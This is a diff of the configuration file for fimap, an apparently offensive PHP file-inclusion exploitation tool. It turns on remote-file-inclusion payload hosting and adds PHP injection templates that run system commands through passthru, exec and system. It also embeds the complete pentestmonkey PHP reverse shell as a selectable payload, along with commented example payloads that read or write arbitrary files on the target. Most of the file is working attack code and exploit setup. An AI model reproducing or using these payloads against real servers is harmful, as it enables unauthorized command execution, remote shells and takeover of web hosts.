@@ -27,7 +27,7 @@ settings = {}
 
 settings["dynamic_rfi"] = {}
 
-settings["dynamic_rfi"]["mode"] = "off" # Set to "ftp" or "local" to use Dynamic_RFI. Set it to "off" to disable it and rely on settings["filesrmt"] files.
+settings["dynamic_rfi"]["mode"] = "local" # Set to "ftp" or "local" to use Dynamic_RFI. Set it to "off" to disable it and rely on settings["filesrmt"] files.
 
 # FTP Mode
 settings["dynamic_rfi"]["ftp"] = {}
@@ -35,13 +35,13 @@ settings["dynamic_rfi"]["ftp"]["ftp_host"] = None
 settings["dynamic_rfi"]["ftp"]["ftp_user"] = None
 settings["dynamic_rfi"]["ftp"]["ftp_pass"] = None
 settings["dynamic_rfi"]["ftp"]["ftp_path"] = None # A non existing file without suffix. Example: /home/imax/public_html/payload
-settings["dynamic_rfi"]["ftp"]["http_map"] = None # The mapped HTTP path of the file. Example: http://tha-imax.de/~imax/payload
+settings["dynamic_rfi"]["ftp"]["http_map"] = None # The mapped HTTP path of the file. Example: http://localhost/~imax/payload
                                                   # For best results make sure that no file in this directory will be interpreted!
 
 # Local Mode
 settings["dynamic_rfi"]["local"] = {}
-settings["dynamic_rfi"]["local"]["local_path"] = None # A non existing file on your filesystem without prefix which is reachable by http. Example: /var/www/payload
-settings["dynamic_rfi"]["local"]["http_map"] = None   # The http url of the file without prefix where the file is reachable from the web. Example: http://localhost/payload
+settings["dynamic_rfi"]["local"]["local_path"] = "/var/www/payload" # A non existing file on your filesystem without prefix which is reachable by http. Example: /var/www/payload
+settings["dynamic_rfi"]["local"]["http_map"] = "http://localhost/payload"   # The http url of the file without prefix where the file is reachable from the web. Example: http://localhost/payload
                                                       # Note that localhost will only work if you are testing local sites. You should define your internet ip - but i believe
                                                       # if you are using this tool you already know it ;)
 
@@ -129,13 +129,14 @@ settings["filesrmt"] = (
 
 
 # Distribution files which can give us infos about the distribution.
-settings["distfiles"]= ("/etc/debian_version", "/etc/redhat-release")
+settings["distfiles"]= ("/etc/debian_version", "/etc/redhat-release", "/etc/gentoo-release")
 
 # CMD to test if PHP injection works and a string which should be found if it was successfull.
 settings["php_info"] = ("<? phpinfo(); ?>", "HTTP_USER_AGENT </td><td class=\"v\">")
 
 # Shell test. The command which should be executed and the result of it to test if the php_exec stuff below works.
-settings["shell_test"] = ("printf %d 0xDEADBEEF", "3735928559")
+# Big thanks to exorzist@freenet.de for this much greater shell test! He is an excellent coder. Believe me.
+settings["shell_test"] = ("echo $((77*77))", "5929")
 
 # PHP Execution Methods. Methods to execute system commands on the exploitable system. 
 # In best case it should echo all stuff back to us.
@@ -146,11 +147,52 @@ settings["php_exec"].append(("passthru", "<? passthru (\"__PAYLOAD__\"); ?>"))
 settings["php_exec"].append(("exec", "<? exec (\"__PAYLOAD__\"); ?>"))
 settings["php_exec"].append(("system", "<? system (\"__PAYLOAD__\"); ?>"))
 
+
+settings["payloads"] = {}
+settings["payloads"]["sys"] = {}
+settings["payloads"]["php"] = {}
+
 # Reverse Shell Code - I have enlighted it.
 # __IP__ will be replaced with the IP.
 # __PORT__ will be replaced with the port.
 # Orginal credit goes to:
 # php-reverse-shell - A Reverse Shell implementation in PHP
 # Copyright (C) 2007 pentestmonkey@pentestmonkey.net
-settings["reverse_shell_code"] = "<?php set_time_limit (0);$VERSION = \"1.0\";$ip = \"__IP__\";$port = __PORT__;$chunk_size = 1400;$write_a = null;$error_a = null;$shell = \"uname -a; w; id; /bin/sh -i\";$daemon = 0;$debug = 0;if (function_exists(\"pcntl_fork\")) { $pid = pcntl_fork();if ($pid == -1) { printit(\"ERROR: Cant fork\");exit(1);} if ($pid) { exit(0);} if (posix_setsid() == -1) { printit(\"Error: Cant setsid()\");exit(1);} $daemon = 1;} else {printit(\"WARNING: Failed to daemonise.This is quite common and not fatal.\");}chdir(\"/\");umask(0);$sock = fsockopen($ip, $port, $errno, $errstr, 30);if (!$sock) { printit(\"$errstr ($errno)\");exit(1);}$descriptorspec = array( 0 => array(\"pipe\", \"r\"), 1 => array(\"pipe\", \"w\"), 2 => array(\"pipe\", \"w\"));$process = proc_open($shell, $descriptorspec, $pipes);if (!is_resource($process)) {printit(\"ERROR: Cant spawn shell\"); exit(1);}stream_set_blocking($pipes[0], 0);stream_set_blocking($pipes[1], 0);stream_set_blocking($pipes[2], 0);stream_set_blocking($sock, 0);printit(\"Successfully opened reverse shell to $ip:$port\");while (1) {if (feof($sock)) {printit(\"ERROR: Shell connection terminated\");break;} if (feof($pipes[1])) {printit(\"ERROR: Shell process terminated\"); break;} $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);if (in_array($sock, $read_a)) { if ($debug) printit(\"SOCK READ\"); $input = fread($sock, $chunk_size); if ($debug) printit(\"SOCK: $input\");fwrite($pipes[0], $input);} if (in_array($pipes[1], $read_a)) { if ($debug) printit(\"STDOUT READ\"); $input = fread($pipes[1], $chunk_size); if ($debug) printit(\"STDOUT: $input\");fwrite($sock, $input);} if (in_array($pipes[2], $read_a)) { if ($debug) printit(\"STDERR READ\"); $input = fread($pipes[2], $chunk_size); if ($debug) printit(\"STDERR: $input\");fwrite($sock, $input);}}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);function printit ($string) { if (!$daemon) { print \"$string\n\";}}?>"
+settings["payloads"]["php"]["Spawn reverse shell"] = (
+                                                       (("IP where the reverse shell should connect to: ", "__IP__"),
+                                                       ("Port where the shell should connect to:","__PORT__")),
+                                                       "<?php set_time_limit (0);$VERSION = \"1.0\";$ip = \"__IP__\";$port = __PORT__;$chunk_size = 1400;$write_a = null;$error_a = null;$shell = \"uname -a; w; id; /bin/sh -i\";$daemon = 0;$debug = 0;if (function_exists(\"pcntl_fork\")) { $pid = pcntl_fork();if ($pid == -1) { printit(\"ERROR: Cant fork\");exit(1);} if ($pid) { exit(0);} if (posix_setsid() == -1) { printit(\"Error: Cant setsid()\");exit(1);} $daemon = 1;} else {printit(\"WARNING: Failed to daemonise.This is quite common and not fatal.\");}chdir(\"/\");umask(0);$sock = fsockopen($ip, $port, $errno, $errstr, 30);if (!$sock) { printit(\"$errstr ($errno)\");exit(1);}$descriptorspec = array( 0 => array(\"pipe\", \"r\"), 1 => array(\"pipe\", \"w\"), 2 => array(\"pipe\", \"w\"));$process = proc_open($shell, $descriptorspec, $pipes);if (!is_resource($process)) {printit(\"ERROR: Cant spawn shell\"); exit(1);}stream_set_blocking($pipes[0], 0);stream_set_blocking($pipes[1], 0);stream_set_blocking($pipes[2], 0);stream_set_blocking($sock, 0);printit(\"Successfully opened reverse shell to $ip:$port\");while (1) {if (feof($sock)) {printit(\"ERROR: Shell connection terminated\");break;} if (feof($pipes[1])) {printit(\"ERROR: Shell process terminated\"); break;} $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);if (in_array($sock, $read_a)) { if ($debug) printit(\"SOCK READ\"); $input = fread($sock, $chunk_size); if ($debug) printit(\"SOCK: $input\");fwrite($pipes[0], $input);} if (in_array($pipes[1], $read_a)) { if ($debug) printit(\"STDOUT READ\"); $input = fread($pipes[1], $chunk_size); if ($debug) printit(\"STDOUT: $input\");fwrite($sock, $input);} if (in_array($pipes[2], $read_a)) { if ($debug) printit(\"STDERR READ\"); $input = fread($pipes[2], $chunk_size); if ($debug) printit(\"STDERR: $input\");fwrite($sock, $input);}}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);function printit ($string) { if (!$daemon) { print \"$string\n\";}}?>"
+                                                     )
 
+
+# Your custom payloads!
+# You can define here some payloads which you want to see in the exploit (-x) menu!
+# There are two categorys of payloads. "sys" payloads and "php" payloads.
+# fimap will check if he can execute php stuff. It it was successfull he will
+# check if he can run system commands thru php.
+# Based on the results, your payloads will be visible or not.
+
+# Some custom payload examples:
+
+# Payloads which can *only* be executed in a 'bash':
+#                      |||    AttackName
+#                      |||    ||||||||||
+#                      vvv    vvvvvvvvvv
+#settings["payloads"]["sys"]["Read a file"] = (
+#                                               (("Filepath to read: ", "__FILE__"),),    # Question(s) and placeholder for user inputs.
+#                                               "cat '__FILE__'"                          # Command to execute with your placeholder(s).
+#                                             )
+
+
+# Payloads which are   PHP code. REMEMBER: You shouldn't use exec() or system() or stuff like that in the php code to be sure it will run correctly.
+#                      |||    AttackName
+#                      |||    ||||||||||
+#                      vvv    vvvvvvvvvv
+#settings["payloads"]["php"]["Write File"] = (
+#                                                (("Filepath to write: ", "__FILE__"),    # Question Number One which its Placeholder for its answer.
+#                                                ("File content: ", "__CONTENT__")),       # Question Number Two which its Placeholder for its answer.
+#                                                "<? $f=fopen(\"__FILE__\", \"w\"); fwrite($f, \"__CONTENT__\"); fclose($f); ?>"  # The PHP Code itself.
+#                                             )
+
+# There is no maximum count of questions you can define.
+# Userinput quotes and so on will NOT be escaped at the moment.
